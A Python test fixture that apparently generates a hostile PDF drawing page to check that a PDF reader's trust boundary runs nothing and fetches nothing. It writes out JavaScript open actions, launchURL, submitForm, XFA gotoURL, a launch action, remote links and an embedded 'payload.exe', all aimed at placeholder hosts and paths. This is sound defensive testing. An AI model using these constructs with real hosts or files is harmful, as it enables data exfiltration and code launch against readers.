"""A drawn page with everything a PDF may hold beyond the drawing, each pointing somewhere real.

Hostile (engine/read/pdf, "The trust boundary"): a JavaScript open action and a script in the name
tree; a launch action (on the page's open) naming `target`; a web link, a go-to-remote action, a submit
and an import naming `url`; an attached file in the name tree and one as an annotation; an image
XObject whose data is said to live at `url` and one said to live at `target` (an external stream,
`/F`); and an XFA form. Nothing in it may run, and neither `url` nor `target` may be touched.
"""

from engine.fixtures.pdf._writer import (
    Page,
    Pdf,
    dictionary,
    document,
    nums,
    place,
    ref,
    string,
    strokes,
    text,
    truetype_font,
)


def _file_spec(target: str, *, url: bool = False) -> bytes:
    if url:
        return dictionary({"FS": b"/URL", "F": string(target)})
    return dictionary({"Type": b"/Filespec", "F": string(target), "UF": string(target)})


def write(url: str = "http://127.0.0.1:9/fetch", target: str = "/nonexistent/secret") -> bytes:
    pdf = Pdf()
    font = truetype_font(pdf)
    script = pdf.stream(b"app.alert('run'); this.submitForm('" + url.encode() + b"');")
    open_action = pdf.add(dictionary({"S": b"/JavaScript", "JS": ref(script)}))
    named_script = pdf.add(
        dictionary({"S": b"/JavaScript", "JS": string("app.launchURL('" + url + "');")})
    )
    attached = pdf.stream(b"not a drawing", {"Type": b"/EmbeddedFile"})
    attached_spec = pdf.add(
        dictionary(
            {"Type": b"/Filespec", "F": string("payload.exe"), "EF": dictionary({"F": ref(attached)})}
        )
    )
    launch = pdf.add(dictionary({"S": b"/Launch", "F": _file_spec(target)}))
    link = pdf.add(
        dictionary(
            {
                "Type": b"/Annot",
                "Subtype": b"/Link",
                "Rect": nums((10, 10, 60, 30)),
                "A": dictionary(
                    {
                        "S": b"/URI",
                        "URI": string(url),
                        "Next": dictionary(
                            {"S": b"/GoToR", "F": _file_spec(url, url=True), "D": b"[0 /Fit]"}
                        ),
                    }
                ),
            }
        )
    )
    submit = pdf.add(
        dictionary(
            {
                "Type": b"/Annot",
                "Subtype": b"/Widget",
                "Rect": nums((70, 10, 120, 30)),
                "A": dictionary({"S": b"/SubmitForm", "F": _file_spec(url, url=True)}),
                "AA": dictionary({"E": dictionary({"S": b"/ImportData", "F": _file_spec(target)})}),
            }
        )
    )
    pinned = pdf.add(
        dictionary(
            {
                "Type": b"/Annot",
                "Subtype": b"/FileAttachment",
                "Rect": nums((130, 10, 150, 30)),
                "FS": ref(attached_spec),
            }
        )
    )
    remote_image = pdf.encoded_stream(
        b"",
        {
            "Type": b"/XObject",
            "Subtype": b"/Image",
            "Width": b"8",
            "Height": b"8",
            "ColorSpace": b"/DeviceGray",
            "BitsPerComponent": b"8",
            "F": _file_spec(url, url=True),
        },
    )
    local_image = pdf.encoded_stream(
        b"",
        {
            "Type": b"/XObject",
            "Subtype": b"/Image",
            "Width": b"8",
            "Height": b"8",
            "ColorSpace": b"/DeviceGray",
            "BitsPerComponent": b"8",
            "F": _file_spec(target),
        },
    )
    xfa = pdf.stream(b"<xdp:xdp><script>xfa.host.gotoURL('" + url.encode() + b"')</script></xdp:xdp>")
    page = Page(
        content=strokes(30)
        + text(900, 60, "S-201", size=12)
        + text(900, 40, "FOUNDATION PLAN", size=8)
        + place("Im1", 400, 400, 20, 20)
        + place("Im2", 500, 400, 20, 20),
        fonts={"F1": font},
        xobjects={"Im1": remote_image, "Im2": local_image},
        annots=[link, submit, pinned],
        entries={"AA": dictionary({"O": ref(launch)})},
    )
    names = dictionary(
        {
            "JavaScript": dictionary({"Names": b"[" + string("run") + b" " + ref(named_script) + b"]"}),
            "EmbeddedFiles": dictionary(
                {"Names": b"[" + string("payload") + b" " + ref(attached_spec) + b"]"}
            ),
        }
    )
    catalog = {
        "OpenAction": ref(open_action),
        "Names": names,
        "AcroForm": dictionary({"Fields": b"[]", "XFA": ref(xfa)}),
    }
    return document(
        pdf, [page], info={"Producer": "DWG To PDF.hdi 27.0.0 (AutoCAD 2027)"}, catalog=catalog
    )
